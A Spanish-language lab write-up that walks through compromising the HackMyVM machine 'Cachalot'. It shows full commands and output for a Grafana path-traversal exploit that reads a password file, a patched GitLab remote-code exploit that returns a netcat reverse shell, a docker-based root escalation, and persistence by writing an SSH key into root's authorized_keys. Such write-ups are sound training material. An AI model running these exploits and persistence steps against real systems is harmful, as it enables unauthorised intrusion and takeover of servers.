---
layout: post
title: Cachalot - Hackmyvm
tags: [ctf, hackmyvm]
---

**Autor**: Mindsflee \\
**Dificultad**: Medio

![img](/imgs/write-ups/hackmyvm/cachalot/cachalot_1.png#center)

## Enumeración

Como en todas las máquinas, lo primero es hacer una enumeración:

```
$ sudo nmap -p- 192.168.1.80       
[..]
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
5022/tcp open  mice
5080/tcp open  onscreen
8080/tcp open  http-proxy
9000/tcp open  cslistener
[...]
```

Dado que hay unos cuantos puertos disponibles, en el write-up voy "directo al grano", citando solo lo necesario para resolver la máquina.

### Puerto 9000

En este puerto se está ejecutando el contenedor docker [pottava/docker-webui](https://hub.docker.com/r/pottava/docker-webui), el cual nos ofrece información de otros contenedores ejecutandose en el servidor.

Tras inspeccionar los contenedores disponibles, encuentro dos cositas interesantes:

- Contenedor Gitlab de una version vulnerable 11.4.7 [2018-19585 2018-19571](https://www.exploit-db.com/exploits/49334)
- Contenedor Grafana de una version vulnerable 8.3.0 [2021-43798](https://www.exploit-db.com/exploits/50581)

En la configuración de Gitlab también podemos ver la ruta del archivo que contiene la contraseña inicial de root.

```
[...]
"Source": "/home/cachalot/srv/initial_root_password",
[...]
```

## Explotación

Lo primero es leer el archivo "initial_root_password" mediante el LFI que existen en grafana. Para esto uso el script de exploitdb mencionado anteriormente.

```
$ python3 /usr/share/exploitdb/exploits/multiple/webapps/50581.py -H http://192.168.1.80:3000        
Read file > /srv/initial_root_password
M4st3rR00tS3cr3t0ne^1337^
```

Tras comprobar que puedo iniciar sesión en gitlab con esta contraseña, me descargo el exploit para la version 11.4.7 de Gitlab y prueba a ejecutarlo, pero me da un error.

```
$ python3 exp.py -u root -p M4st3rR00tS3cr3t0ne^1337^ -g http://192.168.1.80 -l 192.168.1.72 -P 1234
[+] authenticity_token: Na2TFnneKJXfaPXjoQqsQHlEBOmFzDTxT5Crh/61cvgKoSlH7H9BPLJMTv7H1E/Xz36zQdU7thZow0zYN7ps3Q==
[+] Creating project with random name: project3816
Traceback (most recent call last):
  File "/home/kali/Desktop/exp.py", line 69, in <module>
    'input', {'name': 'project[namespace_id]'}).get('value')
AttributeError: 'NoneType' object has no attribute 'get'
```

No tengo apenas experiencia con bs4 así que me pongo a debuggear. El problema está en la función "find" que no encuentra nada, por lo que el "get" tira un error. Para arreglarlo, utilizo "findAll" para asegurar unos cuantos resultados. Despues itero a traves de ellos y pruebo con el primero que tenga un formato "adecuado", en este caso con una longitud de 88 caracteres.

```
[...]
test = soup.findAll('input')
for i in test:
    var = i.get('value')
    if var is not None:
        if len(var) == 88:
            namespace_id = i.get('value')

#namespace_id = soup.find(
#    'input', {'name': 'project[namespace_id]'}).get('value')
[...]
```

Ahora todo lo que hay que hacer es:

- Crear un listener con netcat en el puerto que utilizaremos en el exploit.
- Iniciar sesión en Gitlab para comprobar que se crea un proyecto nuevo.
- Ejecutar varias veces el exploit modificado hasta conseguir una shell.

```
$ python3 last.py -u root -p M4st3rR00tS3cr3t0ne^1337^ -g http://192.168.1.80 -l 192.168.1.72 -P 1234
[+] authenticity_token: mvis41HHpsb9b+BUOtzmovUKzBLdUkDQvpmA2P+L7+TMfmSuaAiFX4N0AY9hnIr3KPspjEwmlwYoN3yPGXrr0A==
[+] Creating project with random name: project6589
[...]
Create project
[+] Running Exploit
[+] Exploit completed successfully!
```

Y con esto ya estoy dentro del servidor!!

```
$ nc -lvnp 1234
    listening on [any] 1234 ...
    connect to [192.168.1.72] from (UNKNOWN) [192.168.1.80] 56068
    git@gitlab:~/gitlab-rails/working$ whoami
    git
```

## Escalado de privilegios

Ejecutando "sudo -l" veo que el usuario "git" tiene permiso para ejecutar "docker" como root sin contraseña. Conociendo esto, el escalado de privilegios es rápido.

```
git@gitlab:~/gitlab-rails/working$ sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# ls -la /root
ls -la /root
total 20
drwx------  2 root root 4096 Oct  9 17:02 .
drwxr-xr-x 18 root root 4096 May 21  2022 ..
lrwxrwxrwx  1 root root    9 Oct  9 16:49 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-------  1 root root   33 Oct  9 17:02 proof.txt
#
```

Con esta terminal ya podemos leer y modificar todos los ficheros del disco de la máquina. Garantizar el acceso ahora es tan sencillo como añadir una clave pública al directorio .ssh de root.

```
# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCZPIhDIl0Nn0bLdVKyWRlzXQfd9JOIBJgTo1kqcfNkCyYWekuz73yvI448MpVcXfOhHnHGYu682iWwM9BsMeB4NI8bk7RbzWAoNQQINmMzvo6UNlsRfmUcxkUo5Sp3sGKypWXzk6FZC+tC1db6PjWH+c2SpNdzzxAPyqRtwOj0vY+a4K1jMUxY7y3JHqq5yuS5xar4rYucRE5M4Fgca1gu0kZBidLi94YlDGDFGEoQVDiiKFai+z8zgPQoMhKEEvp0xkUHnt34WnMNEkDK6aBD/TpQoYtNcQpB35QNMxjcOGdIF0JGPadEO9OTN3iujtUBhBTU04WnCYEDbEbDBjZneZFWZvJySJQoG/KyFcrcQ8eIoxuWxvrx4YuO54oYJqxUz6J5kTonqaZ6Qe73AWHTHCjD7x4YZyPc9m+v67aNdtfOpNfpIW2teFW39k1qHezDuUhKYLVlx/dxpyPleJaVmrqw/7inCb7XlkpJgb/k8mPa7wn6OBDVkfHVsh0ftxs= kali@kali" > /root/.ssh/authorized_keys
```

```
$ ssh root@192.168.1.80 -i test  
[...]
root@cachalot:~# id; hostname;
uid=0(root) gid=0(root) groups=0(root)
cachalot
root@cachalot:~# :)
```

Muchas gracias  **Mindsflee** por esta máquina.
